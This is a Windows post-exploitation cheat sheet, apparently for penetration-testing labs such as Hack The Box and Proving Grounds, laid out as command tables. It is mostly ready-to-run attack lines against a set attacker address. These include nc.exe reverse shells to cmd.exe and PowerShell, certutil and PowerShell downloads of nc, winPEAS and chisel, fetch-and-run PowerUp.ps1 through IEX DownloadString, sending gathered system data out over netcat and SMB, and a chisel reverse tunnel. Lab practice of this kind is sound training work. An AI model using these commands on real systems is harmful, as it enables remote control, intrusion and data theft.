# Windows

## Variables
| Command Type     | Description               | Command                                        |
|:-----------------|:--------------------------|:-----------------------------------------------|
| Varible          | Set LHOST, LPORT1 & LPORT2 to save time (HTB) | `set LHOST=10.10.14.18 & set LPORT1=53 & set LPORT2=443` |
| Varible          | Set LHOST, LPORT1 & LPORT2 to save time (PG) | `set LHOST=192.168.119.127 & set LPORT1=53 & set LPORT2=443` |


## Shell Upgrade
| Command Type | Description | Command |
|:-------------|:------------|:--------|
| Copy (HTTP)  | Copy nc.exe locally | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/nc.exe nc.exe` |
| Copy (SMB)   | Copy nc.exe locally | `copy \\%LHOST%\share\windows\privesc\nc.exe .` |
| Initiate Reverse Shell | Reverse shell with nc.exe (dos) | `nc.exe -e cmd.exe %LHOST% %LPORT1%` |
| Initiate Reverse Shell | Reverse shell with nc.exe (PowerShell) | `nc.exe -e powershell %LHOST% %LPORT2%` |

## Tools
### Setup Tools (Copy / Download) (DOS)
| Command Type     | Description               | Command                                         |
|:-----------------|:---------------------------------:|:-----------------------------------------------|
| Copy (SMB)       | Copy Utilities locally    | `copy \\%LHOST%\share\windows\privesc\privesc.7z .` |
| Copy (SMB)       | Copy Utilities locally    | `copy \\%LHOST%\share\windows\privesc\7za.exe .` |
| Copy (SMB)       | Copy Utilities locally    | `copy \\%LHOST%\share\windows\privesc\chisel-x64.exe .` |
| Copy (HTTP)      | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/privesc.7z privesc.7z` |
| Copy (HTTP)      | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/7za.exe 7za.exe` |
| Copy (HTTP)      | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/winPEASx64.exe winPEASx64.exe`
| Copy (HTTP)      | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/winPEASx86.exe winPEASx86.exe`
| Copy (HTTP)      | If SMB is unavailable     | `certutil.exe -urlcache -f http://%LHOST%/windows/privesc/chisel-x64.exe chisel-x64.exe`

| Copy (RDP)       | RDP Mapped drive   | `xcopy /E \\TSCLIENT\linux\* .` |
| Extract Archive  | 7zip extract              | `7za.exe x privesc.7z` |


### Setup Tools (Copy / Download / Run) (PowerShell)
| Command Type     | Description               | Command |
|:-----------------|:--------------------------|:--------|
| Variable  | Set LHOST to save time | `$env:LHOST = '10.10.14.18' & $env:LPORT1=53 & $env:LPORT2=443` |
| Variable  | Set LHOST to save time | `$env:LHOST = '192.168.0.0' & $env:LPORT1=53 & $env:LPORT2=443` |
| Copy (SMB) | Copy Utilities locally | `copy \\$env:LHOST\share\windows\privesc\privesc.7z .` |
| Copy (SMB) | Copy Utilities locally (PowerShell) | `copy \\$env:LHOST\share\windows\privesc\7za.exe .` |
| Copy  | Copy Utilities locally | `copy \\$env:LHOST\share\windows\privesc\winPEASx64.exe .` |
| Copy  | Copy Utilities locally | `copy \\$env:LHOST\share\windows\privesc\SharpUp.exe .` |
| Copy  | Copy Utilities locally | `copy \\$env:LHOST\share\windows\privesc\PowerUp.ps1 .` |
| Copy | Copy Utilities locally  | `Invoke-WebRequest http://$env:LHOST/windows/privesc/7za.exe -OutFile 7za.exe` | 
| Copy | Copy Utilities locally  | `Invoke-WebRequest http://$env:LHOST/windows/privesc/privesc.7z -OutFile prives.7z` | 
| Copy | Copy Utilities locally  | `Invoke-WebRequest -Uri "http://$env:LHOST/windows/privesc/chisel-x64.exe" -OutFile chisel-x64.exe` | 
| Copy | Copy Utilities locally  | `Invoke-WebRequest http://$env:LHOST/windows/privesc/winPEASx64.exe -OutFile winPEASx64.exe` | 
| Copy | Copy Utilities locally  | `Invoke-WebRequest http://$env:LHOST/windows/privesc/nc.exe -OutFile nc.exe` | 
| Download & Run | PowerUp.ps1 | `IEX(New-Object Net.WebClient).DownloadString('http://$env:LHOST/windows/privesc/PowerUp.ps1'); Invoke-AllChecks` |
| Download & Run | jaws-enum.ps1 | `IEX(New-Object Net.webclient).downloadString('http://10.10.14.18/windows/privesc/jaws-enum.ps1')`
IEX (New-Object Net.WebClient).DownloadString('http://$env:LHOST/windows/privesc/7za.exe')

powershell "IEX(New-Object Net.Webclient).downloadString('http://10.10.14.18/windows/privesc/PowerUp.ps1')"

### Run Tools & Save Results
| Command Type     | Description               | Command |
|:-----------------|:--------------------------|:--------|
| Priv Check       | All in One    | `winPEAS.exe > winPEAS.txt & SharpUp.exe > SharpUp.txt & windows-privesc-check2.exe --audit -a -o wpc-report & WinPrivCheck.bat > WinPrivCheck.txt & systeminfo > systeminfo.txt` |
| Compress         | Compress txt file results | `7za a -t7z privesc.7z *.txt` | 
| Send to host | Send results to Kali SMB | `copy privesc.7z \\192.168.119.127\share` | 
| Send to host     | Send results to Kali host | `nc %LHOST% 235 < privesc.7z`
| Cleanup | Remove utilities | `del *.zip *.exe *.py *.ps1 *.bat *.dll` |
| Cleanup | Copy files to Kali host | `copy * \\%LHOST%\share` | 
| Exploits | Exploit Suggester | `/root/share/windows/privesc/windows-exploit-suggester.py -d /root/share/windows/privesc/2021-01-21-mssb.xls -i privesc/systeminfo.txt`


## Port Tunneling
| Command Type     | Description               | Command |
|:-----------------|:--------------------------|:--------|
| Linux Attack host | Waits for client to connect on 9002 | `/opt/chisel/chisel server --reverse --port 9002` |
| Windows Host | Forwards 3306 & 8888 to the attack host | `.\chisel-x64.exe client $env:LHOST:9002 R:3306:localhost:3306 R:8888:localhost:8888` |
